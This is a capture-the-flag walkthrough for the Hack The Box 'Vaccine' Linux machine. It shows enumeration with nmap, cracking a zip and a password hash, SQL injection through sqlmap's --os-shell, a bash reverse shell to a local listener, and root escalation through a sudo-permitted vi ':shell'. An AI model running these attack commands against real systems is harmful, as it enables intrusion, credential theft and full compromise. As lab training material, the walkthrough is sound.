# Vaccine
## Very Easy

## Solution 

Vaccine is a Linux based machine, once the machine is started. Connect to the hackthebox network using VPN (which can be downloaded from hackthebox) 
```
sudo openvpn <openvpn file>
```
The format of completing the box is by answering the questions, the answers can be found when trying find the flag inside the machine. 

Start by seeing if the machine IP is reachable using ```ping```, 
```
ping -c 4 <IP>
```
Enumerating the machine IP using ```nmap``` to find the services/ports available but using ```-p-``` and ```-T5``` to scan all ports but at a faster rate. 
```
sudo nmap -sV -p- -T5  <IP>
```
The resut of the nmap scan is 
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.17.61
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache htpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Start by logging into the ftp portal using the command
```
ftp <IP Address>
```
After connecting to the ftp portal, use ```ls``` to show the contents of the directory inside and use ```get``` to download the file found to local computer.
```
get <filename>
```
After downloading the zip file, use ```unzip``` command, since it is password protected use zip2john to print the hash to a txt file and use ```john``` to crack the hash to get the password.

The commands are as follows
```
zip2john <filename>.zip hash.txt

john --wordlist=/path/to/wordlist hash.txt
```
After extracting the contents from the zip, there is 2 files a .css and .php file. View the .php file to see for any information. 

Since there is .php and .css file, it could be the one used for the website hosted in port 80. Upon analysing the .php, it is noticed that the password hash is hardcoded in the code. 

Using online website like ```crackstation``` crack the password and use the credentials in .php file to log into the website. 

After logging in understand the functionalities of the website, it can be seen displaying the search word in the URL after initiating search. 

This could be potential injection point, to test if SQL injection is possible type the following in the search box
```
'OR 1=1'
```
If an error happens with SQL command displayed, use sqlmap automate the process of dumping the database/ extract 
sensitive information. So use the command
```
sqlmap -u <URL with parameter> --cookie="PHPSESSID=<cookie>" --os-shell
```
will open shell connected to the machine IP, where reverse shell command can be executed while a listner can be setup in local computer using ```nc -lvnp <port>

For the reverse shell, use the following command
```
bash -c "bash -i >& /dev/tcp/<Local_IP>/<port> 0>&1"
```
To find the password for using sudo command, check the /var/www/html directory within one of the files 

Find the password using the following command
```
cat <filename> | grep password
```
After finding the password, use ```ssh``` to log into the machine since SSH port was open
```
ssh <username>@<IP Address>
```
Run ```sudo -l``` to find the programs the user can run using sudo. The output of the command is
```
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

```
Meaning the user can open the mentioned file using vim as a root user, this can exploited for privilege escalation. 

Open vim using the command 
````
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
Press ```esc``` key and type the following 
```
:shell
```
Use the ```whoami``` command to verify if the privilege escalation is successful. 

Use ```cd``` to change directory to /root and view the content of the root file using ```cat```

